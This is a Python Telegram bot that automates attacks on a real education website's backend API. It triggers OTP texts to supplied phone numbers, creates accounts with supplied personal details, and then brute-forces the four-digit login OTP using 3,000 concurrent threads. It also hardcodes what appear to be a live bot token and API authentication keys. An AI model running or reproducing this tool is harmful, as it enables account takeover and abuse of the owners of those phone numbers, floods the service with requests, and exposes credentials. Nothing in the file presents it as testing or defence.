import requests
import time
import asyncio
import concurrent.futures
import threading
from flask import Flask
from telegram import Update
from telegram.ext import Application, MessageHandler, filters, ContextTypes, CommandHandler
from telegram.error import BadRequest

BOT_TOKEN = "6223059105:AAH7V_L8hlhbpzZgE5j9ZHoZc1DAo8Z7o5I"

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "x-api-key": "xeJJzhaj1mQ-ksTB_nF_iH0z5YdG50yQtwQCzbcHuKA",
    "device-type": "mobile",
    "x-auth-key": "QeQohnkIqobSaDQITN02Ojpe3nC8dXn4hltbRt1t-TIb",
    "user-agent-key": "195696a6d915c14b",
    "Content-Type": "application/json"
}

# Dictionary to store data and list for queue
DATA_MAP = {}
request_queue = []

# Flask app for Koyeb deployment
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "Bot is Running!"

# Function to run Flask on a separate thread
def run_flask():
    flask_app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False)

async def process_login(chat_id, bot, message_data, key):
    try:
        ask_me, mobile_number, ask_name, ask_email, ask_loc = map(str.strip, message_data.split(" - "))
    except ValueError:
        await bot.send_message(chat_id, f"❌ [{key}] Invalid format in data!")
        return

    # Send OTP
    otp_url = "https://backend-cus.careers360.com/api/1/cus/otp-send"
    otp_data = {
        "otp_on": "mobile",
        "cta_clicked": "signup",
        "otp_action": "send",
        "isd_code": "+91",
        "mobile_number": mobile_number
    }

    otp_response = requests.post(otp_url, json=otp_data, headers=HEADERS)
    if otp_response.status_code == 200 and otp_response.json().get("result"):
        sent_message = await bot.send_message(chat_id, f"✅ [{key}] OTP Sent Successfully! 📩")
        time.sleep(2)
        await bot.delete_message(chat_id, sent_message.message_id)
    else:
        await bot.send_message(chat_id, f"❌ [{key}] OTP Sending Failed.")
        return

    # Signup
    signup_url = "https://backend-cus.careers360.com/api/1/cus/signup"
    signup_data = {
        "current_url": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5?destination=https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5&click_location=header",
        "destination": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5&click_location=header",
        "cta_clicked": "signup",
        "country_code": "+91",
        "mobile_number": mobile_number,
        "location": 64,
        "current_location": ask_loc,
        "email": ask_email,
        "education_level": 12,
        "name": ask_name,
        "submit": True,
        "interested_in": [],
        "checkbox_id": 0,
        "checkbox_status": False,
        "passing_year": 2025,
        "degree_interested": 2,
        "domain_id": 1,
        "certification": False
    }

    signup_response = requests.post(signup_url, json=signup_data, headers=HEADERS)
    if signup_response.status_code == 200 and signup_response.json().get("result"):
        user_uuid = signup_response.json()["data"].get("user_uuid")
        uuid_message = await bot.send_message(chat_id, f"✅ [{key}] Signup Successful! UUID: `{user_uuid}`", parse_mode="Markdown")
        time.sleep(2)
        await bot.delete_message(chat_id, uuid_message.message_id)
    else:
        await bot.send_message(chat_id, f"❌ [{key}] Signup Failed.")
        return

    # Login Brute Force OTP
    login_url = "https://backend-cus.careers360.com/api/1/cus/login"
    found_otp = None
    checked_otps = 0
    last_update = -1  # Track the last updated count to avoid redundant edits

    progress_message = await bot.send_message(chat_id, f"🔄 [{key}] Checking OTPs... (0 checked)")

    def try_otp(otp):
        nonlocal found_otp, checked_otps
        if found_otp:
            return None

        login_data = {
            "current_url": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5?destination=https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5&click_location=header",
            "destination": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5&click_location=header",
            "certification": False,
            "cta_clicked": "signup",
            "otp_on": "mobile",
            "country_code": "+91",
            "mobile_number": mobile_number,
            "otp": otp,
            "user_uuid": user_uuid
        }

        login_response = requests.post(login_url, json=login_data, headers=HEADERS)

        checked_otps += 1

        if login_response.status_code == 200 and login_response.json()["data"].get("otp_response") is True:
            found_otp = otp
            return otp

        return None

    async def check_otp_with_updates():
        nonlocal found_otp, checked_otps, last_update
        with concurrent.futures.ThreadPoolExecutor(max_workers=3000) as executor:
            future_to_otp = {executor.submit(try_otp, otp): otp for otp in range(1000, 10000)}

            for i, future in enumerate(concurrent.futures.as_completed(future_to_otp)):
                if found_otp:
                    executor.shutdown(wait=False)
                    break

                # Only update if checked_otps has increased by 300 since last update
                if checked_otps // 1000 > last_update:
                    last_update = checked_otps // 1000
                    try:
                        await progress_message.edit_text(f"🔄 [{key}] Checking OTPs... ({checked_otps} checked)")
                    except BadRequest as e:
                        if "Message is not modified" not in str(e):
                            await bot.send_message(chat_id, f"⚠️ [{key}] Error updating progress: {str(e)}")
                        # Continue even if edit fails

    await check_otp_with_updates()
    await bot.delete_message(chat_id, progress_message.message_id)

    if found_otp:
        await bot.send_message(chat_id, f"✅ [{key}] Login Successful! OTP: `{found_otp}`", parse_mode="Markdown")
    else:
        await bot.send_message(chat_id, f"❌ [{key}] OTP brute-force failed. Could not find correct OTP.")

async def add_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    message = update.message.text.strip()
    bot = context.bot
    
    if message.startswith('/add'):
        entries = message.replace('/add', '').strip().split('\n')
        added_count = 0
        
        for entry in entries:
            entry = entry.strip()
            if not entry:
                continue
            try:
                parts = entry.split(" - ", 1)
                key = parts[0].strip()
                value = parts[1].strip()
                DATA_MAP[key] = value
                request_queue.append((chat_id, value, key))  # Add all entries to queue
                added_count += 1
            except IndexError:
                await bot.send_message(chat_id, f"❌ Invalid format in entry: '{entry}'! Use: `key - ebooks/... - number - name - email - location`", parse_mode="Markdown")
                continue
        
        if added_count > 0:
            await bot.send_message(chat_id, f"✅ Added {added_count} entries to DATA_MAP successfully!")
            if len(request_queue) == added_count:  # If queue was empty before
                await bot.send_message(chat_id, f"Starting to process first entry '{request_queue[0][2]}' immediately!")
                context.job_queue.run_once(process_queue, 0, data=context)  # Process first entry immediately
        else:
            await bot.send_message(chat_id, "❌ No valid entries added! Use format: `key - ebooks/... - number - name - email - location` with each entry on a new line.")
    else:
        await bot.send_message(chat_id, "❌ Use /add followed by entries in format:\n`/add\n1 - ebooks/... - number - name - email - location\n2 - ...`", parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message.text.strip()
    chat_id = update.message.chat_id
    bot = context.bot

    if message in DATA_MAP:
        request_queue.append((chat_id, DATA_MAP[message], message))
        await bot.send_message(chat_id, f"✅ [{message}] Added request to queue. Will process when its turn comes.")
        if len(request_queue) == 1:  # If queue was empty
            context.job_queue.run_once(process_queue, 0, data=context)
    else:
        await bot.send_message(chat_id, f"❌ '{message}' not found! First add data using: `/add\n{message} - ebooks/... - number - name - email - location`", parse_mode="Markdown")

async def process_queue(job_context):
    context = job_context  # The context is passed via the data parameter
    if request_queue:
        chat_id, message_data, key = request_queue.pop(0)
        try:
            await context.bot.send_message(chat_id, f"Processing request for '{key}': {message_data.split(' - ')[1]}")
            await process_login(chat_id, context.bot, message_data, key)
        except Exception as e:
            await context.bot.send_message(chat_id, f"⚠️ [{key}] Error processing request: {str(e)}")
        # Schedule the next item if there are more in the queue
        if request_queue:
            context.job_queue.run_once(process_queue, 600, data=context)  # Next item after 10 minutes

async def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("add", add_data))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    await asyncio.Event().wait()

if __name__ == "__main__":
    # Start Flask in a separate thread
    threading.Thread(target=run_flask, daemon=True).start()

    # Start Telegram bot
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(main())
